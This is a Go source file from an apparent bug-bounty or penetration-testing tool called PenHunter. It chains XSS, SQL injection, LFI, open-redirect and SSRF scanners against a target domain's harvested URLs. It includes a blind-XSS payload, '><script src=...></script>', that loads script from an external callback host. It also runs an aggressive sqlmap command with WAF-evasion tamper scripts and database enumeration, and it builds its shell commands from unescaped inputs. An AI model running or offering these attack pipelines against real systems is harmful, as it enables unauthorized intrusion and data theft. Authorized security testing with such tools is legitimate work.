package core

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/cc1a2b/PenHunter/utils"
)

// RunDalfox runs dalfox for XSS scanning
func RunDalfox(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-dalfox.txt", domain))

	// Get callback URLs from config
	xssCallback := GetXSSCallback()
	redirectDomain := GetRedirectDomain()

	// Filter URLs and prepare command
	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | grep -E '^http' | sed -n '/http[s]*:\\/\\/%s/p' | sed '/\\.js/d' | sed '/\\.css/d' | sed '/\\b\\(jpg\\|png\\|svg\\|css\\|gif\\|jpeg\\|woff\\|woff2\\)\\b/d' | qsreplace '' | anew | grep -Ev '\\.(txt|js|pdf|png|jpeg|jpg|json|css)$' | dalfox pipe -b %s -F http://%s --ignore-return 404,403 -o %s",
		targetFile, domain, xssCallback, redirectDomain, outputFile))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning dalfox... (check tmux session 'xss' for output)%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunBXSS runs bxss for XSS scanning
func RunBXSS(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s.xss.txt", domain))

	// Get XSS callback from config
	xssCallback := GetXSSCallback()

	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | grep '=' | sed -n '/http[s]*:\\/\\/%s/p' | bxss -appendMode -payload '><script src=%s></script>' -parameters | anew -q %s",
		targetFile, domain, xssCallback, outputFile))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning bxss... (check tmux session 'xss' for output)%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunXSStrike runs xsstrike for XSS scanning
func RunXSStrike(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, "xsstrike_target.txt")

	cmd := exec.Command("xsstrike", "--seeds", targetFile, "-t", "10")
	output, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer output.Close()

	cmd.Stdout = output
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning xsstrike... (check tmux session 'xss' for output)%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunSQLMap runs sqlmap for SQL injection scanning
func RunSQLMap(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	sqlmapDir := filepath.Join(fullPath, "sqlmap")

	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | sed -n '/http[s]*:\\/\\/%s/p' | gf sqli | sqlmap --batch --output-dir=%s --risk=3 --level=3 --dbs --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --threads=10 --fresh-queries --random-agent",
		targetFile, domain, sqlmapDir))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning sqlmap... (check tmux session 'sqli' for output)%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunNuclei runs nuclei for LFI scanning
func RunNuclei(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-nuclei-lfi.txt", domain))

	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | sed -n '/http[s]*:\\/\\/%s/p' | nuclei -t ~/nuclei-templates/ -tags lfi -o %s",
		targetFile, domain, outputFile))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning nuclei for LFI...%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunRedirectChecker runs redirect checker
func RunRedirectChecker(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-redirect.txt", domain))

	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | sed -n '/http[s]*:\\/\\/%s/p' | redirect-checker -o %s",
		targetFile, domain, outputFile))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning redirect-checker...%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunSSRFChecker runs SSRF checker
func RunSSRFChecker(targetFile, domain, outputDir string) error {
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-ssrf.txt", domain))

	cmd := exec.Command("sh", "-c", fmt.Sprintf(
		"cat %s | sed -n '/http[s]*:\\/\\/%s/p' | ssrf-checker -o %s",
		targetFile, domain, outputFile))

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("%sRunning ssrf-checker...%s\n", utils.Yellow, utils.NC)
	return cmd.Run()
}

// RunToolInTmux runs a command in a tmux session
func RunToolInTmux(sessionName, command string) error {
	// Create tmux session if it doesn't exist
	checkCmd := exec.Command("tmux", "has-session", "-t", sessionName)
	if err := checkCmd.Run(); err != nil {
		// Session doesn't exist, create it
		createCmd := exec.Command("tmux", "new-session", "-d", "-s", sessionName)
		if err := createCmd.Run(); err != nil {
			return fmt.Errorf("failed to create tmux session: %v", err)
		}
	}

	// Send command to tmux session
	sendCmd := exec.Command("tmux", "send-keys", "-t", sessionName, command, "C-m")
	return sendCmd.Run()
}

// FilterURLsForTool filters URLs for external tools
func FilterURLsForTool(targetFile, domain string) ([]string, error) {
	data, err := os.ReadFile(targetFile)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	var filtered []string
	httpPattern := strings.HasPrefix

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !httpPattern(line, "http://") && !httpPattern(line, "https://") {
			continue
		}
		if !strings.Contains(line, domain) {
			continue
		}
		// Filter out static files
		if strings.Contains(line, ".js") || strings.Contains(line, ".css") ||
			strings.Contains(line, ".jpg") || strings.Contains(line, ".png") ||
			strings.Contains(line, ".svg") || strings.Contains(line, ".gif") ||
			strings.Contains(line, ".jpeg") || strings.Contains(line, ".woff") ||
			strings.Contains(line, ".woff2") {
			continue
		}
		filtered = append(filtered, line)
	}

	return filtered, nil
}

